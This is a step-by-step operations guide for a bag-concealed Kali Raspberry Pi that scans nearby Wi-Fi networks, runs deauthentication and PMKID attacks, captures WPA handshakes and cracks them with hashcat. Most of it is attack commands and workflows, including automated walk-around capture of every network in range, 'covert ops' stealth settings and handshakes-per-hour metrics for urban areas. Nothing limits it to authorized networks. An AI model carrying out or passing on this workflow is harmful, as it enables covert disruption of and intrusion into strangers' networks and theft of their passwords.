# KALI PI ZERO 2W - HEADLESS OPERATION GUIDE

## Table of Contents
1. [Initial Setup](#initial-setup)
2. [Pre-Mission Preparation](#pre-mission-preparation)
3. [Field Operations](#field-operations)
4. [Post-Mission](#post-mission)
5. [Troubleshooting](#troubleshooting)

---

## Initial Setup

### First-Time Configuration

1. **Flash Kali to SD Card**
```bash
   # Use Raspberry Pi Imager with pre-configuration
   # OR manually create ssh file and wpa_supplicant.conf
```

2. **Boot Pi and SSH In**
```bash
   ssh kali@raspberrypi.local
   # Default password: kali
```

3. **Run Initial Setup**
```bash
   cd ~
   git clone https://github.com/your-repo/kali-pi-scripts.git scripts
   chmod +x ~/scripts/*.sh
   ~/scripts/initial_setup.sh
```

4. **Configure WiFi Networks**
```bash
   sudo nano /etc/wpa_supplicant/wpa_supplicant.conf
   # Add your hotspot and home networks
```

5. **Setup Cron Jobs**
```bash
   ~/scripts/setup_cron.sh
```

6. **Reboot**
```bash
   sudo reboot
```

---

## Pre-Mission Preparation

### The Night Before

1. **Charge Battery**
   - Ensure 10,000mAh power bank is fully charged
   - PiSugar if using

2. **Run System Check**
```bash
   ssh kali@raspberrypi.local
   ~/scripts/pre_mission_check.sh
```

3. **Update Wordlists** (optional)
```bash
   cd ~/wordlists
   wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
   tar -xzf rockyou.txt.tar.gz
```

4. **Clear Old Captures** (optional)
```bash
   # Archive old successful captures
   ~/scripts/backup_captures.sh
   
   # Clean old unsuccessful attempts
   find ~/captures/wpa/ -name "*.cap" -mtime +30 -delete
```

5. **Configure FTP Upload** (if using GPU machine)
```bash
   nano ~/scripts/auto_upload.sh
   # Set GPU_HOST, GPU_USER, GPU_PASS
```

---

## Field Operations

### Method 1: Automated Smart Capture (Recommended)

**Use Case:** Walk around, automatically capture everything
```bash
# 1. SSH into Pi
ssh kali@raspberrypi.local

# 2. Start field operations
~/scripts/field_startup.sh

# 3. Launch smart capture in tmux
tmux new -s smart
~/scripts/smart_capture.sh

# 4. Detach tmux
# Press: Ctrl+A, then D

# 5. Disconnect SSH
exit

# 6. Put Pi in bag and go
# System will automatically:
#   - Scan for targets
#   - Attempt PMKID first (silent)
#   - Fall back to handshake capture
#   - Skip already-captured networks
#   - Blacklist problematic targets
#   - Log everything
```

**Check Status While Running:**
```bash
# From phone SSH app or laptop
ssh kali@raspberrypi.local
tmux attach -t smart

# View, then detach again
# Press: Ctrl+A, then D
```

### Method 2: Comprehensive Campaign

**Use Case:** Extended operation (2-4 hours), multiple targets
```bash
# 1. SSH and start campaign
ssh kali@raspberrypi.local
~/scripts/workflow_campaign.sh 7200  # 2 hours

# 2. Attach to view status (optional)
tmux attach -t campaign

# 3. Detach and disconnect
# Press: Ctrl+A, then D
exit

# System will:
#   - Initial 2-minute reconnaissance
#   - PMKID attack on all targets (passive)
#   - Rotate through targets with deauth
#   - Spend 5 minutes per target
#   - Generate report at end
```

### Method 3: Targeted Attack

**Use Case:** You know specific target details
```bash
# 1. Reconnaissance first (if needed)
ssh kali@raspberrypi.local
~/scripts/recon_scan.sh wlan1mon 120  # 2 minute scan

# Review results
cat ~/captures/raw/recon_*-01.csv | grep "TARGET_NAME"
# Note: BSSID, Channel

# 2. Launch targeted attack
~/scripts/workflow_attack.sh AA:BB:CC:DD:EE:FF 6 "TargetWiFi" 1800

# 3. Detach and go
# Press: Ctrl+A, then D
exit

# System will:
#   - Capture handshake for 30 minutes
#   - Continuously send deauth packets
#   - Auto-stop and check for handshake
#   - Auto-upload if successful
```

### Method 4: Passive PMKID Only (Most Covert)

**Use Case:** Maximum stealth, no deauth attacks
```bash
ssh kali@raspberrypi.local

# Enable stealth mode
~/scripts/stealth_mode.sh

# Start PMKID capture
tmux new -s pmkid
~/scripts/pmkid_attack.sh wlan1mon 3600  # 1 hour

# Detach
# Press: Ctrl+A, then D
exit

# System will:
#   - Passively collect PMKIDs
#   - No active attacks (very stealthy)
#   - Works even without clients connected
```

### Method 5: Manual Tmux Session

**Use Case:** Maximum control and flexibility
```bash
# 1. Start comprehensive tmux session
ssh kali@raspberrypi.local
~/scripts/tmux_ops.sh

# 2. You'll see 7 windows:
#    Window 0: Monitor   - System dashboard
#    Window 1: Recon     - Run reconnaissance
#    Window 2: Capture   - Handshake capture
#    Window 3: Attack    - Deauth attacks
#    Window 4: PMKID     - PMKID attacks
#    Window 5: Logs      - Real-time logs
#    Window 6: Shell     - General shell

# 3. Navigate windows
#    Ctrl+A, then 0-6  (switch to window)
#    Ctrl+A, then N    (next window)
#    Ctrl+A, then P    (previous window)

# 4. In Window 1 (Recon), run:
~/scripts/recon_scan.sh wlan1mon 300

# 5. In Window 2 (Capture), after finding target:
~/scripts/capture_handshake.sh wlan1mon 6 AA:BB:CC:DD:EE:FF TargetName

# 6. In Window 3 (Attack), send deauth:
~/scripts/deauth.sh wlan1mon AA:BB:CC:DD:EE:FF 6 20

# 7. Monitor Window 5 (Logs) for results

# 8. Detach when ready
# Press: Ctrl+A, then D
exit
```

---

## Post-Mission

### Retrieving Results

**Method 1: FTP Download (Recommended)**
```bash
# From your laptop/GPU machine
ftp raspberrypi.local
# Login: kali / your_password

cd captures/wpa
mget *.hc22000
cd ../pmkid
mget *.hc22000
bye
```

**Method 2: SCP Transfer**
```bash
# From your laptop
scp -r kali@raspberrypi.local:~/captures/ ~/kali_captures/
```

**Method 3: Auto-Upload (Already Running)**
```bash
# If auto_upload.sh is configured in cron
# Files automatically uploaded hourly to GPU machine
# Check: ~/incoming/ on GPU machine
```

**Method 4: SD Card Direct**
```bash
# Shutdown Pi safely
ssh kali@raspberrypi.local
sudo shutdown -h now

# Remove SD card, insert in laptop
# Navigate to: /home/kali/captures/
```

### Generate Report
```bash
ssh kali@raspberrypi.local
~/scripts/generate_report.sh

# View report
cat ~/reports/operation_report_*.txt

# Or download HTML version
scp kali@raspberrypi.local:~/reports/operation_report_*.html ~/Desktop/
# Open in browser
```

### Cracking on GPU Machine
```bash
# On your GPU machine

# Option 1: Manual cracking
hashcat -m 22000 capture.hc22000 ~/wordlists/rockyou.txt

# Option 2: Auto-crack service (if setup)
# Just upload files to ~/incoming/
# The auto_crack.sh script processes automatically

# Check results
cat ~/cracked/*.cracked
cat ~/cracked/*.summary
```

### Clean Up Pi
```bash
ssh kali@raspberrypi.local

# Archive successful captures
~/scripts/backup_captures.sh

# Clean old data (keeps last 7 days)
find ~/captures/ -name "*.cap" -mtime +7 -delete
find ~/captures/ -name "*.pcapng" -mtime +7 -delete

# Clean logs (keeps last 30 days)
find ~/logs/ -name "*.log" -mtime +30 -delete

# Check disk space
df -h /
```

---

## Troubleshooting

### Pi Won't Connect to WiFi
```bash
# Connect via USB Gadget or serial

# Check WiFi status
sudo nmcli dev status
sudo nmcli dev wifi list

# Reconnect manually
sudo nmcli dev wifi connect "YourHotspot" password "password"

# Or restart networking
sudo systemctl restart networking
sudo systemctl restart wpa_supplicant
```

### Adapter Not Detected
```bash
# Check USB connection
lsusb
# Should show: 0e8d:7961 MediaTek

# If not detected:
# - Check OTG adapter connection
# - Try different USB cable
# - Check power supply

# Reload driver
sudo modprobe -r mt7921u
sudo modprobe mt7921u

# Check interface
iwconfig
```

### Monitor Mode Won't Enable
```bash
# Kill conflicting processes
sudo airmon-ng check kill

# Try manual method
sudo ifconfig wlan1 down
sudo iw dev wlan1 set type monitor
sudo ifconfig wlan1 up

# Verify
iwconfig wlan1
```

### No Handshakes Captured

**Possible causes:**
- Too far from target (move closer)
- No clients connected (try different time)
- Clients not reconnecting (increase deauth count)
- 5GHz network (adapter only does 2.4GHz)

**Solutions:**
```bash
# Increase deauth packets
~/scripts/deauth.sh wlan1mon BSSID CHANNEL 50

# Try PMKID instead (doesn't need clients)
~/scripts/pmkid_attack.sh wlan1mon 300

# Move to different location
# Try during peak hours (evening)
```

### System Overheating
```bash
# Check temperature
vcgencmd measure_temp

# If > 75°C:
# - Remove from bag temporarily
# - Add heatsink to Pi
# - Reduce CPU frequency:
sudo nano /boot/config.txt
# Add: arm_freq=800

# Reboot
sudo reboot
```

### Tmux Session Lost
```bash
# List sessions
tmux ls

# Attach to existing session
tmux attach -t ops
# or
tmux attach -t smart
# or
tmux attach -t campaign

# If session killed, check logs
tail -100 ~/logs/*.log
```

### Battery Died Mid-Operation
```bash
# After recharging and rebooting

# Check for emergency shutdown marker
cat ~/EMERGENCY_SHUTDOWN.txt

# Resume operations
~/scripts/field_startup.sh

# Check what was captured before shutdown
ls -lht ~/captures/wpa/
ls -lht ~/captures/pmkid/

# Generate partial report
~/scripts/generate_report.sh
```

### Cannot SSH Into Pi

**From phone hotspot:**
```bash
# Try IP address instead of hostname
# Check connected devices in phone settings

# Try different SSH apps:
# - Termius
# - JuiceSSH
# - ConnectBot
```

**From laptop:**
```bash
# Ping test
ping raspberrypi.local

# If fails, scan network
nmap -sn 192.168.1.0/24

# Try USB Gadget mode (if configured)
ssh kali@raspberrypi.local
# Or: ssh kali@169.254.x.x
```

---

## Quick Reference Commands

### Start Operations
```bash
~/scripts/field_startup.sh          # Initialize system
~/scripts/tmux_ops.sh                # Full tmux interface
~/scripts/smart_capture.sh           # Automated capture
~/scripts/workflow_campaign.sh 3600  # 1-hour campaign
```

### Check Status
```bash
tmux ls                              # List sessions
tmux attach -t ops                   # Attach to session
~/scripts/generate_report.sh         # Create report
tail -f ~/logs/*.log                 # View logs
```

### Manual Operations
```bash
~/scripts/recon_scan.sh wlan1mon 300                    # Recon
~/scripts/capture_handshake.sh wlan1mon 6 BSSID ESSID   # Capture
~/scripts/deauth.sh wlan1mon BSSID 6 20                 # Deauth
~/scripts/pmkid_attack.sh wlan1mon 600                  # PMKID
```

### File Transfer
```bash
# Upload to GPU
~/scripts/auto_upload.sh

# Manual FTP
ftp raspberrypi.local

# Manual SCP
scp ~/captures/*/*.hc22000 user@gpu:~/
```

### Maintenance
```bash
~/scripts/pre_mission_check.sh       # System check
~/scripts/health_check.sh            # Health check
~/scripts/backup_captures.sh         # Backup
~/scripts/disk_monitor.sh            # Clean space
```

### Tmux Commands
```
Ctrl+A, D          Detach session
Ctrl+A, 0-6        Switch window
Ctrl+A, [          Scroll mode
Ctrl+A, |          Split horizontal
Ctrl+A, -          Split vertical
Alt+Arrow          Navigate panes
```

---

## Tips for Maximum Success

### Best Practices

1. **Pre-charge Everything**
   - Full battery
   - Backup power bank
   - Test connections before leaving

2. **Start Operations Before Deploying**
   - Run field_startup.sh
   - Verify monitor mode enabled
   - Detach tmux session
   - THEN put in bag

3. **Location Matters**
   - Closer = better signal
   - Peak hours = more clients
   - Move if no results after 30 min

4. **Use Smart Capture for Walk-Around**
   - Automatically handles everything
   - Learns and adapts
   - Skips already-captured networks

5. **Check Status Periodically**
   - SSH from phone every 30-60 min
   - Verify captures being collected
   - Adjust if needed

6. **Battery Management**
   - 10,000mAh = 6-8 hours
   - Monitor battery if possible
   - Auto-upload before shutdown

7. **Stealth Considerations**
   - Use stealth_mode.sh for covert ops
   - PMKID only = most stealthy
   - No LEDs, low TX power

### Common Mistakes to Avoid

❌ **Forgetting to enable monitor mode**
✓ Run field_startup.sh first

❌ **Not detaching tmux before disconnecting**
✓ Always Ctrl+A, D before exit

❌ **Deploying without checking adapter**
✓ Run pre_mission_check.sh

❌ **Bag blocking signal too much**
✓ Position adapter near bag edge

❌ **Expecting instant results**
✓ Some targets take 30+ minutes

❌ **Not checking captures until home**
✓ SSH periodically to verify

❌ **Forgetting to backup**
✓ Run backup_captures.sh regularly

---

## Emergency Procedures

### If Pi Becomes Unresponsive

1. **Wait 2 minutes** (might be busy)
2. **Check power** (reconnect if needed)
3. **Hard reboot** (unplug/replug power)
4. **Check SD card** (corruption check)
5. **Restore from backup** (if critical)

### If Adapter Stops Working

1. **Reconnect adapter**
2. **Reload driver**: `sudo modprobe -r mt7921u && sudo modprobe mt7921u`
3. **Reboot system**: `sudo reboot`
4. **Check logs**: `dmesg | tail -50`

### If Battery Critical

1. **Auto-upload triggered** (if configured)
2. **System auto-shutdowns** (safe)
3. **Recharge and power on**
4. **Check ~/EMERGENCY_SHUTDOWN.txt**
5. **Resume operations**

---

## Success Metrics

After each operation, evaluate:

- **Capture Rate**: Handshakes / Total Targets
- **PMKID Success**: PMKIDs / Attempts
- **Time Efficiency**: Captures / Hour
- **Crack Rate**: Cracked / Total Captures

Typical good results:
- 5-10 handshakes per hour (urban)
- 10-20 PMKIDs per hour
- 60%+ capture success rate
- Variable crack rate (depends on passwords)

---

END OF GUIDE